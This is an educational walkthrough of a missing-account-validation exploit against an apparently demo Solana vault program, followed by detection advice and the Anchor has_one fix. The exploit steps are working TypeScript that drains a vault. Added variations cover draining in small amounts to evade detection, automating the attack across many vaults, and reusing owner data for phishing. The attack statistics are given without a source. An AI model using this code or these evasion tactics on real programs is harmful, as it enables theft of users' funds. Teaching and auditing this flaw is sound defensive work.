# Missing Account Validation Exploit Walkthrough

## Executive Summary

This document provides a step-by-step walkthrough of how attackers exploit missing account validation vulnerabilities in Solana programs. The attack allows unauthorized users to withdraw funds from any vault by bypassing ownership checks.

**Severity**: üî¥ **CRITICAL**  
**Impact**: Complete loss of funds  
**Likelihood**: High (common vulnerability pattern)  
**CVSS Score**: 9.8 (Critical)

## Attack Overview

### Vulnerability Summary

The vulnerable vault program fails to validate that the signer of a withdrawal transaction is actually the owner of the vault. This allows any user to withdraw funds from any vault by simply providing the vault's public key and signing the transaction with their own keypair.

### Attack Vector

```
Attacker ‚Üí Vulnerable Program ‚Üí Victim's Vault
    ‚Üì           ‚Üì                    ‚Üì
Signs TX    No Validation      Funds Stolen
```

## Step-by-Step Exploit

### Prerequisites

- Access to a Solana RPC endpoint
- Basic knowledge of Solana transactions
- Victim's vault public key (discoverable through blockchain analysis)

### Step 1: Reconnaissance

**Objective**: Find target vaults with funds

```bash
# Scan for vault accounts using program ID
solana account <PROGRAM_ID> --output json

# Or use blockchain explorers to find vault accounts
# Look for accounts with significant balances
```

**What the attacker looks for**:
- Vault accounts with high balances
- Recently active vaults (indicating real usage)
- Vaults with predictable or discoverable public keys

### Step 2: Analyze Target Vault

**Objective**: Understand the vault structure and current balance

```typescript
// Fetch vault account data
const vaultAccount = await program.account.vault.fetch(targetVaultPubkey);
console.log("Target vault owner:", vaultAccount.owner.toString());
console.log("Target vault balance:", vaultAccount.balance.toString());
```

**Key information gathered**:
- Current balance (determines potential profit)
- Owner public key (for social engineering or further attacks)
- Account structure (to craft the exploit transaction)

### Step 3: Craft Exploit Transaction

**Objective**: Create a withdrawal transaction that bypasses ownership validation

```typescript
// The exploit transaction
const exploitTx = await program.methods
  .vulnerableWithdraw(new anchor.BN(vaultAccount.balance)) // Drain entire balance
  .accounts({
    vault: targetVaultPubkey,        // Victim's vault
    owner: attackerKeypair.publicKey // Attacker's keypair (NOT the real owner!)
  })
  .signers([attackerKeypair])        // Attacker signs the transaction
  .rpc();
```

**Why this works**:
1. The program only checks that `owner` is a `Signer`
2. It doesn't validate that `owner.key() == vault.owner`
3. The attacker can sign as any "owner" they want

### Step 4: Execute the Attack

**Objective**: Submit the malicious transaction to drain the vault

```typescript
try {
  console.log("Executing exploit...");
  const signature = await program.methods
    .vulnerableWithdraw(new anchor.BN(stolenAmount))
    .accounts({
      vault: victimVault,
      owner: attackerKeypair.publicKey
    })
    .signers([attackerKeypair])
    .rpc();
  
  console.log("üö® EXPLOIT SUCCESSFUL!");
  console.log("Transaction signature:", signature);
  console.log("Stolen amount:", stolenAmount);
} catch (error) {
  console.log("Exploit failed:", error.message);
}
```

### Step 5: Verify Success

**Objective**: Confirm the funds were stolen

```typescript
// Check vault balance after attack
const vaultAfter = await program.account.vault.fetch(targetVaultPubkey);
console.log("Vault balance after attack:", vaultAfter.balance.toString());

// Check attacker's balance increase (if funds were transferred)
const attackerBalance = await connection.getBalance(attackerKeypair.publicKey);
console.log("Attacker balance:", attackerBalance);
```

## Attack Variations

### Variation 1: Partial Drainage

Instead of draining the entire vault, steal smaller amounts to avoid detection:

```typescript
// Steal 10% of the balance to stay under the radar
const stealAmount = vaultAccount.balance.div(new anchor.BN(10));
```

### Variation 2: Multiple Vault Attack

Automate the attack across multiple discovered vaults:

```typescript
const targetVaults = await discoverVaults();
for (const vault of targetVaults) {
  await exploitVault(vault);
  await sleep(1000); // Avoid rate limiting
}
```

### Variation 3: Social Engineering Enhancement

Use the stolen owner information for targeted phishing:

```typescript
// Extract owner info for social engineering
const ownerInfo = {
  publicKey: vaultAccount.owner,
  balance: vaultAccount.balance,
  // Use this for targeted attacks
};
```

## Detection and Forensics

### Transaction Analysis

Malicious transactions have these characteristics:

```typescript
// Red flags in transaction analysis:
// 1. Signer != vault.owner
// 2. Large withdrawal amounts
// 3. Immediate fund transfers after withdrawal
// 4. Multiple vault interactions by same attacker
```

### Blockchain Forensics

```bash
# Trace the attack transaction
solana transaction <SIGNATURE> --output json

# Follow the money trail
solana account <ATTACKER_PUBKEY> --output json
```

## Real-World Attack Timeline

### Typical Attack Duration: 5-30 minutes

1. **Minutes 0-5**: Reconnaissance and target identification
2. **Minutes 5-10**: Vault analysis and exploit preparation
3. **Minutes 10-15**: Transaction crafting and testing
4. **Minutes 15-20**: Exploit execution
5. **Minutes 20-30**: Fund extraction and cleanup

### Attack Success Rate

- **Against vulnerable programs**: 95%+
- **Detection rate**: <20% (often discovered hours/days later)
- **Recovery rate**: <5% (funds usually moved quickly)

## Mitigation Verification

### How the Secure Implementation Prevents This

```rust
#[derive(Accounts)]
pub struct SecureWithdraw<'info> {
    #[account(
        mut,
        has_one = owner  // This line prevents the entire attack!
    )]
    pub vault: Account<'info, Vault>,
    pub owner: Signer<'info>,
}
```

**What `has_one = owner` does**:
1. Automatically validates `vault.owner == owner.key()`
2. Fails the transaction if validation fails
3. Provides clear error message: "A has_one constraint was violated"

### Testing the Mitigation

```typescript
// This attack will fail against secure implementation
try {
  await program.methods
    .secureWithdraw(new anchor.BN(1000))
    .accounts({
      vault: victimVault,
      owner: attackerKeypair.publicKey // Wrong owner
    })
    .signers([attackerKeypair])
    .rpc();
  
  // Should never reach here
  throw new Error("Security bypass detected!");
} catch (error) {
  // Expected: "A has_one constraint was violated"
  console.log("‚úÖ Attack blocked:", error.message);
}
```

## Lessons Learned

### For Developers

1. **Always validate account relationships** - never assume they're correct
2. **Use Anchor constraints** - they prevent entire classes of vulnerabilities
3. **Write exploit tests** - if you can't exploit it, you can't secure it
4. **Validate early and often** - check relationships before any state changes

### For Auditors

1. **Look for missing `has_one` constraints** in account contexts
2. **Check for `UncheckedAccount` usage** without validation
3. **Verify manual validation logic** is correct and complete
4. **Test with malicious account combinations**

### For Users

1. **Verify program audits** before depositing significant funds
2. **Start with small amounts** when using new programs
3. **Monitor your accounts** for unexpected changes
4. **Use programs with proven track records**

## Conclusion

Missing account validation is a critical vulnerability that can lead to complete loss of funds. The attack is simple to execute but devastating in impact. Proper use of Anchor constraints like `has_one` provides robust protection against this entire class of vulnerabilities.

**Remember**: In blockchain security, trust must be earned through code, not assumed through design.

---

‚ö†Ô∏è **Ethical Disclosure**: This information is provided for educational and defensive purposes only. Using these techniques against systems you don't own is illegal and unethical.